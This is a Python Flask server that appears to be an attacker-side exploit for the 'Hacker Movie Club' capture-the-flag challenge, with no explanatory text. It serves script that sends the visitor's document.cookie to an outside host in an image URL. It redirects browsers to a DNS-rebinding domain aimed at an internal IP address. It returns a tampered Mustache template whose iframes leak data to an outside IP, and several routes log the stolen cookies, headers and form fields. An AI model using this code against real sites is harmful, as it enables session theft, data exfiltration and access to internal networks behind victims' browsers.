from flask import Flask, make_response, request, current_app, send_file
from datetime import timedelta
from functools import update_wrapper

app = Flask(__name__)

def crossdomain(origin=None, methods=None, headers=None,
                max_age=21600, attach_to_all=True,
                automatic_options=True):
    if methods is not None:
        methods = ', '.join(sorted(x.upper() for x in methods))
    if headers is not None and not isinstance(headers, basestring):
        headers = ', '.join(x.upper() for x in headers)
    if not isinstance(origin, basestring):
        origin = ', '.join(origin)
    if isinstance(max_age, timedelta):
        max_age = max_age.total_seconds()

    def get_methods():
        if methods is not None:
            return methods

        options_resp = current_app.make_default_options_response()
        return options_resp.headers['allow']

    def decorator(f):
        def wrapped_function(*args, **kwargs):
            if automatic_options and request.method == 'OPTIONS':
                resp = current_app.make_default_options_response()
            else:
                resp = make_response(f(*args, **kwargs))
            if not attach_to_all and request.method != 'OPTIONS':
                return resp

            h = resp.headers

            h['Access-Control-Allow-Origin'] = origin
            h['Access-Control-Allow-Methods'] = get_methods()
            h['Access-Control-Max-Age'] = str(max_age)
            if headers is not None:
                h['Access-Control-Allow-Headers'] = headers
            return resp

        f.provide_automatic_options = False
        return update_wrapper(wrapped_function, f)
    return decorator

@app.route("/", methods=["GET", "POST"])
@crossdomain(origin="*")
def root():
    print(request.form)
    return """
<iframe id="iframe" src="http://172.16.2.5"></iframe>
<script>
document.write("<img src='http://36f4bcc8.ip.no.vulnerable.services/img/" + document.cookie + "'></img>");
</script>
"""

@app.route("/img/<cookies>")
@crossdomain(origin="*")
def image(cookies):
    print(request.headers)
    print(request.cookies)
    return send_file("test.jpg", mimetype="image/jpg")

@app.route("/js/app.js")
@crossdomain(origin="*")
def js():
    return """
window.location = "http://ac100205.36f4bcc8.rbndr.us"
"""


@app.route("/cdn/main.mst")
@crossdomain(origin="*")
def cdn():
    print(request.headers)
    return """
<div class="header">
Hacker Movie Club
</div>

{{#admin}}
<div class="header admin">
Welcome to the desert of the real.
</div>
{{/admin}}

<table class="movies">
<thead>
 <th>Name</th><th>Year</th><th>Length</th>
</thead>
<tbody>
{{#movies}}
  {{^admin_only}}
  <iframe src='http://54.244.188.200/log/{{name}}'></iframe>
    <tr>
      <td>{{ name }}</td>
      <td>{{ year }}</td>
      <td>{{ length }}</td>
    </tr>
  {{/admin_only}}
{{/movies}}
</tbody>
</table>

<div class="captcha">
  <div id="captcha"></div>
</div>
<button id="report" type="submit" class="report"></button>
"""

@app.route("/log", methods=["GET", "POST"])
@crossdomain(origin="*")
def log():
    print(request.form)
    return ""

app.run(host="0.0.0.0", port=80, debug=True)
